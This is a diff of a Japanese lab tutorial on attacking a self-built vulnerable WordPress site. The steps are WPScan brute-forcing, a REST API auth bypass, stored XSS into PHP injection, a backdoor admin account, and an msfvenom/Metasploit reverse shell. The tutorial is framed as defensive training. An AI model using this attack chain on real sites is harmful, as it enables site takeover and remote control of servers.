@@ -12,9 +12,34 @@ mathjax: false
 * content
 {:toc}
 
+# はじめに
+
+このセッションではWordPressを題材にしてWebサイトを守る技術を学びます。
+
+WordPressは誰でも簡単にスタイリッシュなWebサイトを構築できる素晴らしいCMSです。
+W3Techsによると全世界のWebサイトのうち32%はWordPressで作成されているそうです。
+一方でWordPressには非常に多くの脆弱性が発見されており改ざんの被害が後を絶ちません。
+改ざんされたWordPressはマルウェアの配布に利用されることもあります。
+WordPressを防衛することは、サイバー空間の安全を維持し、サイトオーナーとユーザーの価値を最大化することに繋がります。
+
+効果的な防衛を実現するためには、防衛対象の仕組みを理解した上で攻撃手段を理解しなければなりません。
+まずは環境構築を通じてWordPressの仕組みを学びましょう。次にサイバーキルチェーンに従っていくつかの代表的な攻撃手段を学びましょう。最後に攻撃の痕跡がどのように残るのか検証し、効果的な防衛について議論しましょう。
+
+# 免責
+このセッションにはWordPressを改ざんする具体的なノウハウが含まれますが、読者に対して改ざん行為を推奨するものではありません。
+Webページを改ざんするなどコンピュータや電磁的記録を破壊して業務を妨害する行為は、刑法234条の2である電子計算機損壊等業務妨害罪などにより、処罰の対象となります。
+このセッションに含まれる内容を不用意に実施したことにより、読者が被ったいかなる不利益についても、当サイトでは責任を負いません。
+
 # 環境構築
 
-## php
+WordPressは次のコンポーネントから構成されます。
+
+- ブラウザからのリクエストを処理するApche http等のWebサーバ
+- ユーザーアカウントやサイトコンテンツを保存するMySQL
+- データベースに基づきWebページを動的に生成するPHP
+- Webサイトのひな型になるWordPress CoreやPlugin
+
+## PHP
 ```
 # phpのインストール
 yum install -y php php-mysql
@@ -37,9 +62,10 @@ phpinfo();
 END
 ```
 
-### (option)firewalld/selinux
-検証環境を手早く構築するためにセキュリティ機構を停止しています。
-本来は適切なアクセス許可を付与するべきです。
+**ファイアウォール/SELinux**
+
+検証環境を手早く構築するためにファイアウォールとSELinuxを停止しましょう。
+余裕があれば、これらの適切な設定方法について学ぶのも悪くありません。
 ```
 # ファイアウォールの停止
 systemctl stop firewalld
@@ -48,13 +74,15 @@ systemctl stop firewalld
 setenforce 0
 ```
 
-テストページにアクセスして動作確認します。
+テストページにアクセスして動作確認しましょう。
 
 ![](/images/wordpress/phpinfo.png)
 
 ## MySQL(MariaDB)
+
 WordpressのバックエンドDBのMySQLを用意します。
 ここで作成するデータベース名、ユーザー名、パスワードは後で参照するので覚えておいてください。
+
 ```
 # MariaDBのインストールと起動
 yum install -y mariadb mariadb-server
@@ -83,38 +111,44 @@ echo 'select Db, User from db;'| mysql -u root -D mysql -prootpassword
 echo 'show tables;'|mysql -u wpadmin -D wpdb -pwpadmin
 ```
 
-## wordpress
+次のようなエラーが返された場合はwpadminユーザーの作成に失敗しているので手順を再確認してください。
+
+`ERROR 1045 (28000): Access denied for user 'wpadmin'@'localhost' (using password: YES)`
+
+## WordPress Core
 wordpress公式が古いバージョンのWordPressを配布しています。
 利用する脆弱性に応じたWordPressを取得してください。
-例としてWordPress4.6.0の設置手順を記載します。
+画像の例ではWordPress4.6.0を設置する手順を示していますが、後の検証をスムーズに進めるためにはWordPress4.7.0を設置する方が良いでしょう。
+
 ```
 # wordpressのダウンロードと設置
-wget https://ja.wordpress.org/wordpress-4.6-ja.tar.gz -O /tmp/wordpress-4.6-ja.tar.gz
-tar -zxvf /tmp/wordpress-4.6-ja.tar.gz -C /var/www/html/
-mv /var/www/html/wordpress/ /var/www/html/4.6.0/
+wget https://ja.wordpress.org/wordpress-4.7-ja.tar.gz -O /tmp/wordpress-4.7-ja.tar.gz
+tar -zxvf /tmp/wordpress-4.7-ja.tar.gz -C /var/www/html/
+mv /var/www/html/wordpress/ /var/www/html/4.7.0/
 
 # アクセス権限をapache:apacheに変更
-chown -R apache: /var/www/html/4.6.0
+chown -R apache: /var/www/html/4.7.0
 ```
 ブラウザからwordpressのパスにアクセスすると初期設定ウィザードが開きます。
-いくつかの項目を埋めてwp-config.php（Wordpressの設定ファイル）を作成します。
 
 ![](/images/wordpress/setup-config.png)
 
 MySQLに作成したデータベース名、ユーザー名、パスワードを指定します。
-ここで指定するユーザーはサイトの管理者ではありません。
+画像の例ではテーブル接頭辞を`wp_46`としていますが、後の検証をスムーズに進めるためにはデフォルトの`wp_`で進めた方が良いでしょう。
 
 ![](/images/wordpress/setupconfig2.png)
 
-wp-config.phpが作成されたらこの画面が表示されます。
+設定が無事終わればこの画面が表示されます。
 まだインストール実行をクリックしないでください。
 
 ![](/images/wordpress/setupconfig3.png)
 
 今回は脆弱性のある環境を構築するため、あらかじめWordpressの自動更新を無効化します。
+設定ウィザードによって生成された`wp-config.php`に`define('AUTOMATIC_UPDATER_DISABLED', true);`という行を追記しましょう。
+
 ```
 # Wordpressの自動アップデートを無効化
-echo "define('AUTOMATIC_UPDATER_DISABLED', true);" >> /var/www/html/4.6.0/wp-config.php
+echo "define('AUTOMATIC_UPDATER_DISABLED', true);" >> /var/www/html/4.7.0/wp-config.php
 ```
 
 自動更新を無効化したらインストール実行をクリックします。
@@ -123,7 +157,7 @@ echo "define('AUTOMATIC_UPDATER_DISABLED', true);" >> /var/www/html/4.6.0/wp-con
 
 ![](/images/wordpress/setupconfig4.png)
 
-サイトの情報を設定してWordPressをインストールをクリックすれば構築は完了です。
+サイトの情報を設定して`WordPressをインストール`をクリックすれば構築は完了です。
 
 ![](/images/wordpress/installcomplete.png)
 
@@ -131,7 +165,8 @@ Hello world!にアクセスできることを確認します。
 
 ![](/images/wordpress/wpindex.png)
 
-### (option)wp_posts
+**データベースの確認**
+
 WordPressのコンテンツはデータベースに格納されています。
 mysqlにアクセスすることで投稿内容やユーザーデータを確認できます。
 ```
@@ -150,13 +185,59 @@ echo "select * from wp_usermeta where meta_key Like 'wp_capabilities';" | mysql 
 
 # 攻撃
 
-## コンテンツ改ざんの脆弱性
-WordPress4.7.0からREST APIが実装されました。
-APIを介してコンテンツの取得、更新、削除が行えます。
-REST APIが有効ならば以下のURLでコンテンツの一覧を取得できます。
+攻撃手段を理解するにあたってはフレームワークを活用しましょう。
+[MITRE ATT&CK](https://attack.mitre.org/resources/enterprise-introduction/)によると情報システムに対する攻撃は7段階に分類されます。
+この一連の攻撃はサイバーキルチェーンと呼ばれ、未知の攻撃だとしてもこの流れには従うとされています。
+これからサイバーキルチェーンの一部を体験してみましょう。
+
+## Recon: ターゲットの偵察
+
+WordPressが生成するHTMLソースからは様々な情報が読み取れます。
+WoredPress Coreのバージョンや使用されているPluginのバージョン、その他にもサイトに存在するユーザーアカウント名なども分かります。
+そのような情報を効率的に収集するツールとして`WPScan`が有名です。
+自分で構築したWordPressに対して情報収集をしてみましょう。
+
+ターゲットサーバに到達できるKali Linux上で操作することを想定しています。
+
+```
+# 基本的な情報を列挙する
+wpscan -u http://target-server/wordpress-dir/
+
+# ユーザーアカウントを列挙する
+wpscan -u http://target-server/wordpress-dir/ --enum users
+
+# ユーザーアカウントを指定してパスワードリストの中から一致する物を全探索する
+wpscan -u http://target-server/wordpress-dir/ --username targetuser --wordlist passwordlist
+```
+
+ブルートフォースを行う際は、質の良いパスワードリストの入手が課題になります。
+[OpenWall](https://download.openwall.net/pub/wordlists/passwords/password.gz)が提供しているリストは基本的なワードが含まれていてコンパクトなので手軽に利用できます。
+また、pastebinやtorネットワーク上に実システムから漏えいしたパスワードリストがアップロードされるている事もあります。
+
+WordPressのバージョンや脆弱性のあるPluginの有無などの情報を収集できましたか？
+ターゲットが複雑なパスワードを使用していなかった場合は、この時点で特権アカウントの情報も入手出来ているかもしれません。
+
+## Exploit: Coreの脆弱性
+
+脆弱性とは何でしょうか。
+それはバグが含まれる古いバージョンのソフトウェアや簡単に推測されるパスワードなどです。
+あなたは事前の偵察によってターゲットの脆弱性を知ることが出来ました。
+今からWordPress4.7.0が抱える脆弱性を利用してみましょう。
+
+**REST APIとは**
+
+WordPress4.7.0からREST APIによるコンテンツへのアクセスが実装されました。
+それ以前にはWebブラウザからWordPressのダッシュボードにログインして記事を編集する必要があったのです。
+REST APIが実装された事によってダッシュボードにログインしなくても同様の操作ができるようになりました。
+
+試しにブラウザから次のURLにアクセスしてみましょう。
+JSON形式の情報を得ることが出来たはずです。
+
 ```
 http://localhost/4.7.0/index.php/wp-json/wp/v2/posts/
 ```
+
+**REST APIの脆弱性**
 
 WordPress4.7.0のREST APIには認証バイパスの脆弱性があります。
 例えば以下のpythonコードはWordPress4.7.0のHello World!ページを書き換えます。
@@ -177,34 +258,19 @@ U2FsdGVkX19T2S9GM16Rn3P+PPFPGvIL+jolJnOxec9PRAVK/AdeJUax1l5d9k9knMAjAEEz5EXGx8hK
 ![](/images/wordpress/fiddler02.png)
 
 WordPressのユーザーアカウントを使わずにコンテンツを書き換えることが出来ました。
-ただし、WordPressのセキュリティ機能であるksesの働きにより、XSSに繋がる`<script>`タグ等を書き込むことは出来ません。
-ksesを突破するには特権アカウントを奪う必要があります。
+ただし`<script>`などの一部のタグは書き込むことが出来ません。
+WordPressにはksesというセキュリティ機能が有り、XSSに繋がるような文字列が除去されるためです。
+この脆弱性を使って出来ることは、フィッシングサイトを作成して閲覧者にリンクをクリックさせる事ぐらいでしょうか。
 
 ![](/images/wordpress/fiddler03.png)
 
-## ユーザーアカウントの奪取
+## Exploit: Pluginの脆弱性
 
-ユーザーアカウントを奪取するシンプルな方法の一つはブルートフォースです。
-WPScanを使ってユーザーアカウントを列挙し、パスワードリストを組み合わせてアタックします。
-```
-# ユーザーアカウントを列挙する
-wpscan -u http://target-server/wordpress-dir/ --enum users
+他に利用できる脆弱性は無いでしょうか？
+ksesの影響を受けずにXSSが出来るような手段が必要です。
 
-# ユーザーアカウントを指定してパスワードリストの中からヒットする物を全探索する
-wpscan -u http://target-server/wordpress-dir/ --username targetuser --wordlist passwordlist
-```
-
-ブルートフォースを行う際は、質の良いパスワードリストの入手が課題になります。
-[OpenWallが提供しているpassword.gz](https://download.openwall.net/pub/wordlists/passwords/password.gz)は手軽に利用できます。
-また、pastebinやtorネットワーク上に、実システムから漏えいしたパスワードリストがアップロードされる事もあります。
-
-対象のサーバの防御が甘く、ブルートフォースに十分な時間を掛けられるなら、この手法が通用することもあるでしょう。
-
-## XSSの脆弱性
-
-ブルートフォースに時間を掛けられないなら、あなたはスナイパーのように相手の隙を探すことも出来ます。
-WordPress CoreもしくはPluginに含まれるXSSの脆弱性を利用すれば、ksesの影響を受けずに特権アカウントを得ることが出来るかもしれません。
-例えば、対象のWordPressに[Activity Log Plugin](https://ja.wordpress.org/plugins/aryo-activity-log/)がインストールされていれば、次の攻撃を試す価値があります。
+このセッションでは、あなたは敢えて脆弱性のあるPluginをWordPressにインストールしたはずです。
+意図したとおりに[Activity Log Plugin](https://ja.wordpress.org/plugins/aryo-activity-log/)がインストールされていれば次の攻撃を試す価値があります。
 
 悪用を防ぐためaes256で暗号化してあります。パスワードは弊社名の略称です。
 ```
@@ -213,19 +279,24 @@ U2FsdGVkX1+coBOcBKCzqamqzRdhiX1JjgOV4C8E4yI9RaEtIXVyOLV057UnGTF79q30sZ85xxYwjpjy
 
 ![](/images/wordpress/fiddler04.png)
 
-攻撃に成功すればActivity Logにアクセスログが追記されます。
-Webサイトのオーナーがログを確認したタイミングで格納型XSSが起動します。
+攻撃に成功すればActivity LogにXSSを含むアクセスログが追記されます。
+このログはWordPressの管理者にしか見えませんが、わざわざPluginをインストールするような管理者なら定期的に確認するはずです。
+管理者がログを確認したタイミングで格納型XSSが起動します。
+
+セキュリティを強化するPluginが攻撃の糸口になるとは皮肉なものですね。
 
 ![](/images/wordpress/log_activity01.png)
 
-## 有用なXSSペイロード
+## Execution: 任意のコード実行
 
 おめでとう！あなたはターゲットに不正なスクリプトを注入し、アラートを表示させることに成功しました！
-でも、ちょっと待ってください。あなたは脅威に対する理解を深め、実際にお客様のサーバを監視する必要があったはずです。現実の攻撃はこんなチュートリアルでは済みません。
+でも、ちょっと待ってください。
+現実の攻撃はこんなチュートリアルでは済みません。
 ここからは、どのようなスクリプトを用意すればターゲットに致命的なバックドアを作成できるのかを学びます。
 
-### phpコード注入
-まずは次のワンライナーを注入し、Activity Logを表示して格納型XSSを起動しましょう。
+格納型XSSの手順を参照しながら次のワンライナーを書き込みましょう。
+XSSを起動するにはActivity Logを表示する必要があります。
+本来は管理者のアクセスを待つ場面ですが、このセッションではあなたが管理者に代わってXSSを起動してください。
 
 悪用を防ぐためaes256で暗号化してあります。パスワードは弊社名の略称です。
 ```
@@ -236,22 +307,24 @@ U2FsdGVkX18/WB2d2+ipDPcSVsIZ62Px7VNRwC0LmdXjCO0CeknoJqnPW/Dnzn9YcikfpcrEWVbdzBKb
 U2FsdGVkX18zqMrMd7J7zH5zoUm4c2y88uH778CNivZkXzZVnPAQG3Bg/flqLYWNMVlhw68SG/EaA6tAXjG9Zx0cAhtXVoRK32bEkeTZ9gGcvZKm/Q0tJXMQNa6C9/Kkd/w6RJLQ/1vidYMsLOkg54HogdF9y3hPiWufYaASvcCOT/lFkuOpLZwRSC0Kx+binmwEfSifjSzGJhgd2U7JMWtbLV7iKrul5UiXbDfpOKKr0QsZplOrlViIvfqIGrSAcB02LY85Z6G4EKB+aMJlPRMrdDojyfPP452BAQVzUORK42KPFJoXgyuHMKHC1E2VNpiNJjIScOB+SkwUbyWejUsV3fCXvKZZzZX11AHPEGZ2pEI86zTMEcsnAyYKbHpjMVu5xQU2uGUWnvXBaTP1Ke01016L02EXIvAeUlt+VTCbcG1LdwvVoQJbn61g0YoXrhBIOQVjA+ijwB5S8gVPRQevIJwPb3H/eqUfy8/BobK5VdwLe5uwuxrGUG7mFmPg6CqGsyZw6Tn+i37OZ6jMGoSzimizSHfeExVxoBFH0FM=
 ```
 
-その後ページを更新するとphpinfoが表示されます。
-
-![](/images/wordpress/xss01.png)
-
-ダッシュボードから 外観>テーマの編集>テーマヘッダー を確認すると、XSSで注入されたphpコードが確認できます。
-このコードが実行された事により、ターゲットにphpinfoが出力されるようになりました。
+ダッシュボードから 外観>テーマの編集>テーマヘッダー を確認するとXSSで注入されたphpコードが確認できます。
+テーマヘッダーはWordPressのヘッダーを出力するためのphpファイルです。
+この改ざんはあらゆるページに影響するということです。
 
 ![](/images/wordpress/xss02.png)
 
-このXSSペイロードは[XSS in WordPress: a tutorial](https://www.dxw.com/2017/07/wordpress-xss-tutorial/)を参考にしました。
+phpinfoの出力についてはセッションの最初に確認しましたね。
+ダッシュボードを抜けて一般ユーザー向けのパスを確認すると次のような結果になるはずです。
 
-### データベース操作
+![](/images/wordpress/xss01.png)
 
-phpinfoは貴重な情報ですが、もう少し工夫してみましょう。
-WordPressデータベースを操作し、バックドアとして利用する特権ユーザーを作成します。
-次のワンライナーを注入して、XSSを起動してください。
+### Persistence: 特権アカウントの作成
+
+任意コードが実行できたならターゲットを完全に掌握するまであと一歩です。
+WordPressデータベースを操作してあなただけが使える特権ユーザーを作成してみましょう。
+次のワンライナーを使用してください。
+
+悪用を防ぐためaes256で暗号化してあります。パスワードは弊社名の略称です。
 ```
 U2FsdGVkX1+lrU5qd6vLjVmy8kjGOn4THRV7StgjfP34q0Vfh6ibLsS3G8FpfL60kpkre4Nz8oj/EBny4kaQ6+6AKbv+ZJkyifomgjU/cvnsVpLHcRvF6f7YK2YyWQoWbhHc9iQuij0P6m+kOnkaJ4kXHS1XV8Je4VYeKZsMRZDnlO2XEKgV31Ial9tpPwhuQXLyt+VRh68AV3i9/b6uD4PuLloLvzcNZNgUm02AyDHvvB1kvhI2hvj/yecVHEGgzc22HgoRVknDrCa5kvSGZZcsk7XbvrKb9d4KNfcauey1nFa6YLhrOGocsTqZZ7iR4/cknhpYgOwWeh1MQVXuOxQ9sy3dVluxj965z0/w93191UtQX279D/Dn6xDVgBoncT0MFjb20ZU92K/3YSb4e1Ije6zNgoDXGDCotrCSPvWyLGPEiCBS1s1NfoWpqxXa5S2ud3YZ2GJluLsfQnLIyj21kSZwZwIJ6c/RvqBXK7EgUebfUYPK/y+oDpIz2VGNwGus5QJsfQ1Du8S3poMLAEIFBE6hSsrkwauW//b4JiL0TjzL+vLHHfYLJ7rLPiZL6+ZGvgh057GrD2hFoL4GHNFlNfuGONfSMkYy7D3tNI8ntUrFj6aO3L90lN2Klh1F33JlwcTLSKTQ+i9FrLUOr8YuWddJfLzyC/XiDKc1fO/dNDn0rkZB2uTphS0oW3MS0bnfWtkITvjTFxIhyaY/iyyYXl9Vx54bbSGY/r2BxfmG4+IXSbdSoOXByhxhQrfXiVwTB0n59BkJYzWP3M+2ivqu2g7Vg69aFN40vUhisJNAwDAnoRgGU+96Iz2kx/6pLQibqfHIy4qUIS2nq8nv5g==
 ```
@@ -289,22 +362,25 @@ $wpdb->insert(
 ?>
 ```
 
-WordPressのダッシュボードに今作ったユーザーでログインできることを確認しましょう。
+Activity LogからXSSを起動したらWordPressから一旦ログアウトしてください。
+そして、今作った特権ユーザーアカウントでWordPressにログインできることを確認しましょう。
 
 ![](/images/wordpress/xss03.png)
 
-ダッシュボードに辿り着いたなら、あなたはこのサイトを支配下に収めたということです。
+無事ダッシュボードに辿り着いたなら、あなたはこのサイトを支配下に収めたということです。
 この先何をするのかはあなたの想像力にかかっています。
 
 ![](/images/wordpress/xss04.png)
 
-### リバースシェル
+## C&C: リバースシェル
 
 リバースシェルを設置すればターゲットをOSレベルで支配することが出来ます。
 Kali Linuxを起動してphpのリバースシェルを生成しましょう。
 次の例ではC2サーバが172.16.0.254:4444でコネクトバックを待ち受けることを想定しています。
 複雑なコードなのでXSSを介して書き込むことは困難です。
-WordPressのダッシュボードから404.phpなどを直接編集してコードを書き込みましょう。
+
+あなたは既に特権ユーザーとしてダッシュボードにログインすることが出来るはずです。
+404.phpなどを編集して直接phpコードを書き込みましょう。
 
 **リバースシェルの生成**
 ```
@@ -319,6 +395,9 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.0.254 LPORT=4444 -f raw
 
 **C2サーバの起動**
 
+リバースシェルを設置したらC2サーバの準備をしましょう。
+Kali LinuxでMetasploitを使ってreverse_tcpを起動します。
+
 ```
 msfconsole
 msf > use exploit/multi/handler
@@ -332,8 +411,10 @@ msf exploit(handler) > exploit
 
 **リバースシェルの起動**
 
-```
-http://target-server/wordpress-dir/cracked.php
-```
+すべての準備は整いました。
+Webブラウザからリバースシェルが設置されたphpファイルにアクセスしましょう。
+Metasploitのコンソールを確認するとコネクトバックが成立していることが分かります。
 
 ![](/images/wordpress/reverse03.png)
+
+# まとめ
